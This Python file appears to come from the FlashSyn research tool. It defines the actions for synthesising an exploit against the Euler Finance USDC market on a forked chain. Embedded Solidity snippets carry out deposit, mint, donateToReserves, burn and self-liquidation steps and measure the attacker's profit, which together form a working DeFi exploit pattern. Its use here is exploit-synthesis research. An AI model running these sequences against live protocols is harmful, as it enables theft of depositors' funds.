import sys
import os
import config

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
sys.path.append(os.path.dirname(SCRIPT_DIR))
sys.path.append(os.path.dirname(os.path.dirname(SCRIPT_DIR)))

from Actions.macros import *
from Actions.Utils import *
from Actions.UtilsPrecision import *
from Actions.Action import *
from Actions.AttackDAG import *
from FlashSynProActions.ActionPro import *
from synthesizer import *


class eulerAction(ActionPro):
    # This is a vector of global states  
    initialBalances = {"USDC": 400000000}  # initial capital, need to be consistent with the foundry script
    ## initial balances of the attacker
    # initially the attacker has 400000000 USDC

    currentBalances = initialBalances.copy()  # Don't change

    # Used to calculate the profit = (weighted sum of final balances - 
    # ETH is the only token of interest
    TokenPrices = {"USDC": 1.0}    # token prices at the specific block

    TargetTokens = TokenPrices.keys()    # Don't change: token of interest


    # how can we use return value of profitSummary() of Foundry to calculate profit?
    def calcProfit(stats): 
        if stats is None:
            return 0
        # We choose to calculate profit here because it's hard to handle 
        # integer subtraction in the Solidity.
        USDC_earned = stats[0] - eulerAction.initialBalances['USDC']
        return USDC_earned


    # in most cases, we don't need to change this function
    # however, we might want to try different TargetDataPoints and maxLen
    @classmethod
    def initialPass(cls, actionList, actionDependencies, ActionWrapper, maxLen = None):
        if maxLen == None:
            largestLen = 0
            for actionDependency in actionDependencies:
                if len(actionDependency) > largestLen:
                    largestLen = len(actionDependency)
            maxLen = largestLen

        action_list_1 = actionList
        # seq of actions
        actionSpecs = []
        for ii in range(len(actionDependencies)):
            temp = actionDependencies[ii] + [actionList[ii]] 
            actionSpecs.append( temp )
        start = time.time()
        initialPassCollectData4( actionSpecs , ActionWrapper, TargetDataPoints = 500, maxLenGlobal = maxLen)
        ShowDataPointsForEachAction( action_list_1 )
        end = time.time()
        print("in total it takes %f seconds" % (end - start))


    # After executing initialPass(), paste the data points printed to this function.
    @classmethod
    def runinitialPass(cls):
        # Build one approximator per terminal action from the collected data.
        # The action sequence comes from each file's saved payload (names), and
        # classes are resolved via the registry (cls.action_by_name) — not by
        # splitting the pkl filename on "_" or looking names up in globals().
        map = loadDataPoints()
        helpMap = {}
        for key in map.keys():
            payload = map[key]
            if len(payload) < 3:
                sys.exit("stale data file '{}.pkl' (pre-registry format); "
                         "re-run data collection".format(key))
            points, values, names = payload[0], payload[1], payload[2]
            actionStr = names[-1]
            actionList = [cls.action_by_name(n) for n in names]
            if len(points) > 0:
                helpMap.setdefault(actionStr, {})[key] = (actionList, [points, values])
        for actionStr in helpMap.keys():
            approx = NumericalApproximatorsPro(helpMap[actionStr])
            target = cls.action_by_name(actionStr)
            target.approximators = approx
            target.approximators.refreshTransitFormula()


class eulerDeposit(eulerAction):
    approximators = NumericalApproximatorsPro()

    numInputs = 1        # num of parameters undetermined
    tokensIn = ['USDC']    # the token taken from the attacker
    tokensOut = ['eUSDC']    # the token given to the attacker
    range = [0, 200000000]     # a range of parameters we would like FlashSyn to try


    # part of foundry script used to execute the action
    @classmethod
    def actionStr(cls):
        action = '''        // Action: deposit
        eUSDC.deposit(0, $$ * 1e6);
        '''
        return action

    # part of foundry script used to collect data points for the action
    @classmethod
    def collectorStr(cls):
        action = '''        // Collect  Deposit: USDC --> eUSDC  State: eUSDCBalance
        //        State: eUSDCBalance
        uint eUSDCGot = eUSDC.balanceOf(address(attacker));
        eUSDC.deposit(0, $$ * 1e6);
        eUSDCGot = eUSDC.balanceOf(address(attacker)) - eUSDCGot;
        revert(Strings.append( "FlashSyn: ", eUSDCGot / 1e18 ) );
        '''
        cls.collectorNumSize = 1
        return action


    # How are we gonna use the output of the approximator?
    # We need to update the global states and change user balances
    @classmethod
    def transit(cls, inputs, actionList):
        cls.currentBalances["USDC"] -= inputs[-1]
        output0 = cls.simulate(inputs, actionList)[0]
        if "eUSDC" not in cls.currentBalances:
            cls.currentBalances["eUSDC"] = 0
        cls.currentBalances["eUSDC"] += output0
        return 


class eulerMint(eulerAction):
    approximators = NumericalApproximatorsPro()
    numInputs = 1     # num of parameters undetermined
    tokensIn = ['eUSDC']    # the token taken from the attacker
    tokensOut = ['eUSDC', 'dUSDC']   # the token given to the attacker
    range = [0, 2000000000]    # a range of parameters we would like FlashSyn to try
    # part of foundry script used to execute the action
    @classmethod
    def actionStr(cls):
        action = '''      // Action2: eUSDC mint:    --> eUSDC, dUSDC
        eUSDC.mint(0, $$ * 1e6);\n'''
        return action

    # part of foundry script used to collect data points for the action
    @classmethod
    def collectorStr(cls):
        action = '''        // Collect: mint
        uint eUSDCGot = eUSDC.balanceOf(address(attacker));
        eUSDC.mint(0, $$ * 1e6);
        eUSDCGot = eUSDC.balanceOf(address(attacker)) - eUSDCGot;
        revert( Strings.append("FlashSyn: ", eUSDCGot / 1e18 ) );
        '''
        return action


    # How are we gonna use the output of the approximator?
    # We need to update the global states and change user balances
    @classmethod
    def transit(cls, inputs, actionList):
        if "dUSDC" not in cls.currentBalances:
            cls.currentBalances["dUSDC"] = 0
        cls.currentBalances["dUSDC"] += inputs[-1]
        output0 = cls.simulate(inputs, actionList)[0]
        if "eUSDC" not in cls.currentBalances:
            cls.currentBalances["eUSDC"] = 0
        cls.currentBalances["eUSDC"] += output0
        return 


class eulerLiquidateWithdraw(eulerAction):
    # one approximator for one value
    approximators = NumericalApproximatorsPro()

    numInputs = 0     # num of parameters undetermined
    tokensIn = ['dUSDC', 'eUSDC']    # the token taken from the attacker
    tokensOut = ['USDC']   # the token given to the attacker


    # part of foundry script used to execute the action
    @classmethod
    def actionStr(cls):
        action = '''      // Action: eUSDC LiquidateWithdraw
        vm.stopPrank();
        vm.startPrank(attacker2);
        temp = Liquidation.checkLiquidation(address(attacker2), address(attacker), address(USDC), address(USDC));
        repay = temp.repay;
        yield = temp.yield;
        Liquidation.liquidate(address(attacker), address(USDC), address(USDC), repay, yield);
        eUSDC.burn(0, type(uint).max);
        eUSDC.withdraw(0, type(uint).max);
        USDC.transfer(address(attacker), USDC.balanceOf(address(attacker2)));
        vm.stopPrank();
        vm.startPrank(attacker);
        '''
        return action

    # part of foundry script used to collect data points for the action
    @classmethod
    def collectorStr(cls):
        action = '''// Collect: eUSDC LiquidateWithdraw
        uint USDCgot = USDC.balanceOf(address(attacker));
        vm.stopPrank();
        vm.startPrank(attacker2);
        temp = Liquidation.checkLiquidation(address(attacker2), address(attacker), address(USDC), address(USDC));
        repay = temp.repay;
        yield = temp.yield;
        Liquidation.liquidate(address(attacker), address(USDC), address(USDC), repay, yield);
        eUSDC.burn(0, type(uint).max);
        eUSDC.withdraw(0, type(uint).max);
        USDC.transfer(address(attacker), USDC.balanceOf(address(attacker2)));
        vm.stopPrank();
        vm.startPrank(attacker);
        USDCgot = USDC.balanceOf(address(attacker)) - USDCgot;
        revert(Strings.append("FlashSyn: ", USDCgot / 1e6 ));
        '''
        return action


    # How are we gonna use the output of the approximator?
    # We need to update the global states and change user balances
    @classmethod
    def transit(cls, inputs, actionList):
        output0  = cls.simulate(inputs, actionList)[0]
        cls.currentBalances["dUSDC"] = 0
        cls.currentBalances["eUSDC"] = 0
        cls.currentBalances["USDC"] += output0
        return 


class eulerDonate(eulerAction):
    # one approximator for one value
    approximators = NumericalApproximatorsPro()

    numInputs = 1     # num of parameters undetermined
    tokensIn = ['eUSDC']    # the token taken from the attacker
    tokensOut = []   # the token given to the attacker
    range = [0, 2000000000]    # a range of parameters we would like FlashSyn to try

    # part of foundry script used to execute the action
    @classmethod
    def actionStr(cls):
        action = '''      // Action2: eUSDC donate
        eUSDC.donateToReserves(0, $$ * 1e18);
        '''
        return action

    # part of foundry script used to collect data points for the action
    @classmethod
    def collectorStr(cls):
        action = '''        // Collect: eUSDC donate
        uint eUSDCTaken = eUSDC.balanceOf(address(attacker));
        eUSDC.donateToReserves(0, $$ * 1e18);
        eUSDCTaken = eUSDCTaken - eUSDC.balanceOf(address(attacker)) ;
        revert(Strings.append("FlashSyn: ",  eUSDCTaken / 1e18 ) );
        '''
        return action


    # How are we gonna use the output of the approximator?
    # We need to update the global states and change user balances
    @classmethod
    def transit(cls, inputs, actionList):
        output0 = cls.simulate(inputs, actionList)[0]
        cls.currentBalances["eUSDC"] -= output0
        return 


class eulerBurn(eulerAction):
    # one approximator for one value
    approximators = NumericalApproximatorsPro()

    numInputs = 1     # num of parameters undetermined
    tokensIn = ['eUSDC', 'dUSDC']    # the token taken from the attacker
    tokensOut = []   # the token given to the attacker
    range = [0, 200000]    # a range of parameters we would like FlashSyn to try

    # part of foundry script used to execute the action
    @classmethod
    def actionStr(cls):
        action = '''      // Action2: eUSDC donate
        eUSDC.burn(0, $$ * 1e18);
        '''
        return action

    # part of foundry script used to collect data points for the action
    @classmethod
    def collectorStr(cls):
        action = '''        // Collect: eUSDC donate
        uint eUSDCTaken = eUSDC.balanceOf(address(attacker));
        uint dUSDCTaken = dUSDC.balanceOf(address(attacker));
        eUSDC.burn(0, $$ * 1e18);
        eUSDCTaken = eUSDCTaken - eUSDC.balanceOf(address(attacker)) ;
        dUSDCTaken = dUSDCTaken - dUSDC.balanceOf(address(attacker));
        revert(Strings.append("FlashSyn: ",  Strings.appendWithSpace( eUSDCTaken / 1e18,  dUSDCTaken / 1e6 ) ) );
        '''

        return action


    # How are we gonna use the output of the approximator?
    # We need to update the global states and change user balances
    @classmethod
    def transit(cls, inputs, actionList):
        vec = cls.simulate(inputs, actionList)
        output0 = vec[0]
        output1 = vec[1]
        cls.currentBalances["eUSDC"] -= output0
        cls.currentBalances["dUSDC"] -= output1
        return 


class eulerTouch(eulerAction):
    # one approximator for one value
    approximators = NumericalApproximatorsPro()

    numInputs = 0     # num of parameters undetermined
    tokensIn = []    # the token taken from the attacker
    tokensOut = []   # the token given to the attacker
    range = []    # a range of parameters we would like FlashSyn to try

    # part of foundry script used to execute the action
    @classmethod
    def actionStr(cls):
        action = '''      // Action2: eUSDC touch
        eUSDC.touch();
        '''
        return action

    @classmethod
    def collectorStr(cls):
        action = '''      // Collect: eUSDC touch (no measured output)
        eUSDC.touch();
        revert(Strings.append("FlashSyn: ", uint(0)));
        '''
        return action

    # How are we gonna use the output of the approximator?
    # We need to update the global states and change user balances
    @classmethod
    def transit(cls, inputs, actionList):
        pass


def flashsyn_setup():
    config.ExecutionMode = DVD
    config.command = "./run.sh euler ETH 16818064"
    config.benchmarkName = "euler"
    actions = [eulerDeposit, eulerBurn, eulerTouch, eulerDonate, eulerMint, eulerLiquidateWithdraw]
    dependencies = [[b for b in actions if b is not a] + [a] for a in actions]
    AttackDAGGenerator.setActionDependency(generateActionDependency(actions, dependencies))
    return {"wrapper": eulerAction, "actions": actions,
            "dependencies": dependencies, "max_len": 6}


